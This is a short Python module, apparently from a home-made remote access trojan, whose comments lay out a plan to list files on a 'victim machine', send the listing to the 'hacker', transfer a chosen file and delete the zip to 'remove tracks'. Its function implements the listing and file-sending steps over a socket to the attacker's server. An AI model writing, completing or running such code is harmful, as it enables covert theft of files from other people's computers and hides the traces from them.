from glob import glob
import json

DELIMETER = "<END_OF_RESULTS>"

#get files and folders list in the directory
#Create a dictionary of the files in the dictionary

# Serialize the dictionary

#Add delimeter to the end and send to hacker

#Deserialize and print items 
#ask the user to select item to download
#Send the selected item file or folder to victim
#Receive the selected item on victim machine
#Zip the selected file or folder
#Send the selected file or folder
#Send the zipped file to hacker
#Remove the zip file on victim machine to remove tracks

def upload_file_folders(my_socket):
    print("[+] Uploading to server")

    files = glob("*")

    dict = {}

    for index, file in enumerate(files):
        dict[index] = file

        
    #Serializing
    dict_byte = json.dumps(dict)
    #b'0x24'
    bytes_with_delimeter = dict_byte + DELIMETER
    
    raw_bytes = bytes_with_delimeter.encode()
    
    print("[+] Sending Serialized list of files")
    my_socket.socket.send(raw_bytes)

    filename = my_socket.receive_data()

    print("[+] File selected by user: ", filename)
    my_socket.send_file(filename)





